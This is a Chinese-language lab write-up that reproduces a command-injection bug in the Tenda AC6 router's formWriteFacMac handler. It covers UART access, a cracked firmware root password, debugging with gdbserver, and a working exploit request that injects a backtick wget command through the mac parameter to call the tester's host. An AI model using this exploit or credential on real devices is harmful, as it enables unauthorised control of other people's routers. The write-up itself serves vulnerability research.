# Tenda AC6 命令执行漏洞--真机调试分析
> Raz0r
> 来源：https://www.iotsec-zone.com/article/458

# AC6_rce_实体调试

品牌：tenda  ac6
固件：US_AC6V2.0RTL_V15.03.06.23_multi_TD01

复现漏洞描述：The parameter mac in the function formWriteFacMac is concatenated and causes the execution of a system command.
函数formWriteFacMac中的参数mac拼接命令造成命令执行。

![0.png](https://www.iotsec-zone.com/api/image/v2/20240815/d3g8cer4wc44t5lrxu.png)

![1.png](https://www.iotsec-zone.com/api/image/v2/20240815/d3g8cjud6oxthvjrcw.png)
此函数的调用接口为WriteFacMac，即当我们访问路径goform/WriteFacMac的时候，会执行到危险函数。

---

# ac6实机测试

![2.png](https://www.iotsec-zone.com/api/image/v2/20240815/d3g8cs0ny3vric5dbe.png)

红色这里是uart调试口

![3.png](https://www.iotsec-zone.com/api/image/v2/20240815/d3g8cxlnjrnevuh54o.png)

断电下，用万用表蜂鸣模式，接触电源口和uart口中的GND，万用表就会响。这里正面最右边的口就是GND.

设备接电后，万用表调到20v,VCC会稳定在3.3v左右。

重接设备的电后，TX会发送数据，电压不断变化。

![4.png](https://www.iotsec-zone.com/api/image/v2/20240815/d3g8d49osv1aethke0.png)
这里我已经把GND,TX,RX三个接口连接到FT232,然后连接电脑。

这里我是用secureCRT连接uart的。
在连接前需要确定几个参数。
1.端口类型serial  com5

![5.png](https://www.iotsec-zone.com/api/image/v2/20240815/d3g8db9gnk18g4ukfe.png)
2.波特率  baud rate = 115200

![6.png](https://www.iotsec-zone.com/api/image/v2/20240815/d3g8dg2no5jb075ntk.png)

在固件中，一般会写baud rate ，我们可以通过grep几个常用baud rate 来确定.

![7.png](https://www.iotsec-zone.com/api/image/v2/20240815/d3g8dpa68hv0zm35zd.png)

点击connect.

![8.png](https://www.iotsec-zone.com/api/image/v2/20240815/d3g8dvfoykoizmmsw5.png)

成功进入uboot，但是这里需要输入密码。
试试常用密码root. admin这些都不对。
看看固件里的密码

![9.png](https://www.iotsec-zone.com/api/image/v2/20240815/d3g8e0p7jcgwhnpbh6.png)

```

root:$1$nalENqL8$jnRFwb1x5S.ygN.3nwTbG1:0:0:  发现了root密码的hash

$id$salt$encrypted

id表示加密算法，1代表MD5，5代表SHA-256，6代表SHA-512 salt表示密码学中的Salt,系统随机生成 encrypted表示密码的hash

由于Linux的密码加密使用了Salt,所以无法使用彩虹表的方式进行破解,常用的方法为字典破解和暴力破解
```

使用john来解密，解密后发现这里root用户解密后的密码为Fireitup

---

拿到密码成功登录shell

![10.png](https://www.iotsec-zone.com/api/image/v2/20240815/d3g8e96rofbzdrmfdd.png)

现在我将vm虚拟机ubuntu桥接 

---
ac6       192.168.0.1
win        192.168.0.102
ubuntu     192.168.0.103

---

现在我们来确定ac6上有哪些程序，能帮助我们下载gdbserver 到ac6

![11.png](https://www.iotsec-zone.com/api/image/v2/20240815/d3g8ei1oktdnfpbfyz.png)

![12.png](https://www.iotsec-zone.com/api/image/v2/20240815/d3g8em4us0k6wevsuo.png)
最后发现有wget
那么我们在ubuntu上开一个http服务，用wget的方式下载gdbserver用于调试。

![13.png](https://www.iotsec-zone.com/api/image/v2/20240815/d3g8ew271gtpeuzrbj.png)
我们的架构为32-bit LSB executable, MIPS, MIPS32 rel2 

![14.png](https://www.iotsec-zone.com/api/image/v2/20240815/d3g8f25qn1p8tfuagd.png)

我们用gdbserver-7.12-mipsel-mips32rel2-v1传输上去调试。

    
```

wget http://192.168.0.103:8000/gdbserver-7.12-mipsel-mips32rel2-v1

```

![15.png](https://www.iotsec-zone.com/api/image/v2/20240815/d3g8f8jw7kx6f18rue.png)
显示只读系统，查看权限后，发现tmp目录有修改权限。
我们将文件下载到tmp目录 ，然后修改gdb权限为777

![16.png](https://www.iotsec-zone.com/api/image/v2/20240815/d3g8fe8jwi8ifur59s.png)

---

现在我们就可以开始调试了 。

```
 ./gdbserver-7.12-mipsel-mips32rel2-v1 :9999 --attach 1013
```

![17.png](https://www.iotsec-zone.com/api/image/v2/20240815/d3g8fmeqo2diqp5rih.png)
在危险函数0x000451E4地址下断点。b formwriteFacMac 也可

---
gdbsh脚本

```
set sysroot lib/
set architecture mips
set endian little
set solib-search-path lib/
target remote 192.168.0.1:9999
b *0x000451E4

```
---

ubuntu调试
```
gdb-multiarch ./bin/httpd -x gdbsh
```

---

burp发送exp包测试命令执行

```
GET /goform/WriteFacMac?mac=`wget%20http://192.168.0.103/` HTTP/1.1
Host: 192.168.0.1
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
X-Requested-With: XMLHttpRequest
Referer: http://192.168.0.1/main.html
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: password=21232f297a57a5a743894a0e4a801fc3rantgb
Connection: close
```

---

接收后调试

![18.png](https://www.iotsec-zone.com/api/image/v2/20240815/d3g8gd67rfp1jb6yei.png)

执行到0x45052c,执行后

![19.png](https://www.iotsec-zone.com/api/image/v2/20240815/d3g8gj3xt1r5tz7wbh.png)

发现我们的payload已经进来了

![20.png](https://www.iotsec-zone.com/api/image/v2/20240815/d3g8gnnw2tv5awxfs6.png)

继续执行，这里执行dosystemcmd

![21.png](https://www.iotsec-zone.com/api/image/v2/20240815/d3g8gsldknajxkrbul.png)

继续执行到下一步后，成功执行wget [http://192.618.0.103:8000/](http://192.618.0.103:8000/)

![22.png](https://www.iotsec-zone.com/api/image/v2/20240815/d3g8h0gq3ymut6ueyl.png)
成功命令执行。
